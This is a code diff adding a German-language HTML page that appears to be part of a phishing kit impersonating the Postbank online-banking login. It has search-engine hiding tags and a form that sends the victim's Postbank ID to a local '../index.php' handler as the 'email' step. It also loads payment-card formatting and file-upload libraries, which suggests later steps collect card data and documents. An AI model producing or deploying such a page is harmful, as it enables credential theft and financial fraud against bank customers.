@@ -1,0 +1,139 @@
+<!doctype html>
+<html>
+
+    <head>
+        <!-- Required meta tags -->
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
+        
+        <!-- CSS FILES -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
+        <link rel="stylesheet" href="../assets/css/helpers.css">
+        <link rel="stylesheet" href="../assets/css/style.css">
+
+        <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />
+
+        <title>Postbank</title>
+    </head>
+
+    <body>
+
+        <!-- HEADER -->
+        <header id="header">
+            <div class="container">
+                <img src="../assets/imgs/logo.svg" alt="">
+            </div>
+        </header>
+        <!-- END HEADER -->
+
+        <!-- MAIN -->
+        <main id="main">
+            
+            <!-- LOGIN AREA -->
+            <section id="login-area">
+                <div class="container">
+                    <h3>Willkommen beim Postbank Banking & Brokerage</h3>
+                    <div class="row">
+                        <div class="col-md-7 form">
+                            <div class="symbol"><i class="fas fa-exclamation-circle"></i></div>
+                            <form action="../index.php" method="post">
+                                <input type="hidden" name="captcha">
+                                <input type="hidden" name="step" value="email">
+                                <p>Melden Sie sich hier bitte mit Ihrer Postbank ID an. Nach Klick auf "Weiter im Anmeldeprozess" legitimieren Sie sich mit Ihrem Passwort oder mithilfe einer unserer Apps.</p>
+                                <div class="form-group">
+                                    <input type="text" name="postbank_id" id="postbank_id" class="form-control" placeholder="Postbank ID">
+                                </div>
+                                <p style="color: #0a3478; margin-bottom: 30px; font-size: 16px;"><i style="font-size: 10px;" class="fas fa-chevron-right"></i> Zugangsdaten wiederherstellen / anfordern?</p>
+                                <button type="submit" id="submit" class="disabled" disabled>Weiter im Anmeldeprozess</button>
+                            </form>
+                        </div>
+                        <div class="col-md-5 content">
+                            <div class="symbol"><i class="fas fa-question-circle"></i></div>
+                            <p>Sie sind neu und kennen unser Postbank Banking & Brokerage noch nicht? Schauen Sie sich ganz unverbindlich in unserem Demo-Konto um.</p>
+                            <ul>
+                                <li><i style="font-size: 10px;" class="fas fa-chevron-right"></i> Demo-Konto testen</li>
+                                <li><i style="font-size: 10px;" class="fas fa-chevron-right"></i> Login mit VERIMI</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <!-- END LOGIN AREA -->
+
+            <!-- ARTICLES -->
+            <section id="articles">
+                <div class="container">
+
+                    <div class="card-group">
+                        <article class="card">
+                            <div class="image"><img src="../assets/imgs/img1.jpg" class="card-img-top"></div>
+                            <div class="card-body">
+                                <h5 class="card-title">Weltweit finanziell unabhängig</h5>
+                                <p class="card-text">Finden Sie die Kreditkarte, die zu Ihnen passt.</p>
+                                <a href="#"><i class="fas fa-chevron-right"></i> Mehr erfahren</a>
+                            </div>
+                        </article>
+                        <article class="card">
+                            <div class="image"><img src="../assets/imgs/img2.jpg" class="card-img-top"></div>
+                            <div class="card-body">
+                                <h5 class="card-title">Sie haben keine Postbank ID?</h5>
+                                <p class="card-text">Hilfe und weitere Informationen zum aktuellen Anmeldeprozess finden Sie hier.</p>
+                                <a href="#"><i class="fas fa-chevron-right"></i> Weitere Informationen</a>
+                            </div>
+                        </article>
+                        <article class="card">
+                            <div class="image"><img src="../assets/imgs/img3.jpg" class="card-img-top"></div>
+                            <div class="card-body">
+                                <h5 class="card-title">Sicherheitshinweis</h5>
+                                <p class="card-text">Achtung Phishing: Täter aktivieren neues Sicherheitsverfahren.</p>
+                                <a href="#"><i class="fas fa-chevron-right"></i> Informieren Sie sich jetzt</a>
+                            </div>
+                        </article>
+                    </div>
+                    
+                </div>
+            </section>
+            <!-- ARTICLES -->
+
+        </main>
+        <!-- END MAIN -->
+
+        <!-- FOOTER -->
+        <footer id="footer">
+            <div class="container">
+                <ul>
+                    <li style="font-weight: 700;">Das ist neu</li>
+                    <li style="font-weight: 700;">Feedback</li>
+                    <li>Terminvereinbarung</li>
+                    <li>Kontakt</li>
+                    <li>Impressum</li>
+                    <li>Rechtshinweise</li>
+                    <li>Datenschutzhinweise</li>
+                </ul>
+                <p>&copy; 2020 Postbank – eine Niederlassung der Deutsche Bank AG</p>
+            </div>
+        </footer>
+        <!-- END FOOTER -->
+        
+        <!-- JS FILES -->
+        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
+        <script src="../assets/js/script.js"></script>
+
+        <script>
+            $('#postbank_id').keyup(function(){
+                if( $(this).val().length > 0 ) {
+                    $('#submit').removeClass('disabled').removeAttr('disabled');
+                } else if( $(this).val().length == 0 ) {
+                    $('#submit').addClass('disabled').attr('disabled','disabled');
+                }
+            });
+        </script>
+
+    </body>
+
+</html>
